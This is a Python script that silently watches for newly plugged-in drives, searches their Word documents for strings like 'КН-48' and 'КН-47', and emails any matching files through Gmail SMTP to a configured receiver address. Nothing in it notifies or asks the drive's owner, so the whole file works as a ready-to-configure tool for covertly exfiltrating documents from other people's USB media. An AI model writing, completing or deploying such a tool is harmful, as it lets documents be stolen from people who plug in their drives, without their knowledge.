import os
import time
from datetime import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from transliterate import slugify
import docx


# CONFIG
fromaddr = "YOUR_MAIL"
password = "YOUR_PASSWORD"
toaddr = "MAIL_RECEIVER"


file_ext = ('.docx', '.doc', )  # TODO: '.txt', '.rar', '.zip'
list_drive = ('C', 'D', )  # Default drives
search_name_in_files = ('КН-48', 'КН-47', )  # which strings will search in files


def send_mail(fromaddr, toaddr, password, files):
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "FILES"

    body = "time {}".format(datetime.now())

    msg.attach(MIMEText(body, 'plain'))

    print(files)

    # cycle adds attachment to mail
    for file in files:
        attachment = open(file, "rb")

        part = MIMEBase('application', 'octet-stream')

        part['Content-Type'] = "text/plain; charset=utf-8"
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        if slugify(file) != None:
            file = slugify(file)
        part.add_header('Content-Disposition', "attachment; filename={}".format(file))

        msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
    print("Files were sent")


def find_files(direct='F', ):
    list_files = []
    for root, dirs, files in os.walk(direct + ':\\'):
        for file in files:
            if (file.endswith(file_ext)):
                list_files.append(os.path.join(root, file))

    return list_files


def disk_checker(list_drive_new=[]):
    for drive in range(ord('A'), ord('N')):
        if not os.path.exists(chr(drive) + ':'):
            if chr(drive) in list_drive_new:
                list_drive_new.remove(chr(drive))

        elif os.path.exists(chr(drive) + ':'):
            if (chr(drive) not in list_drive) and (chr(drive) not in list_drive_new):

                # if disk new, we`ll search docx file in drive
                list_drive_new.append(chr(drive))
                list_file = find_files(chr(drive))

                if list_file:
                    files_with_phrases = find_phrases(list_file, search_name_in_files)
                    if files_with_phrases:
                        send_mail(fromaddr, toaddr, password, files_with_phrases)


def find_phrases(files, phrases):
    files_with = []
    for file in files:
        doc = docx.Document(file)
        allText = []

        for docpara in doc.paragraphs:
            allText.append(' '.join(docpara.text.split()))

        for text in allText:
            if list(filter(text.__contains__, phrases)) != []:
                files_with.append(file)
                break

    return files_with


while True:
    disk_checker()
    time.sleep(5)
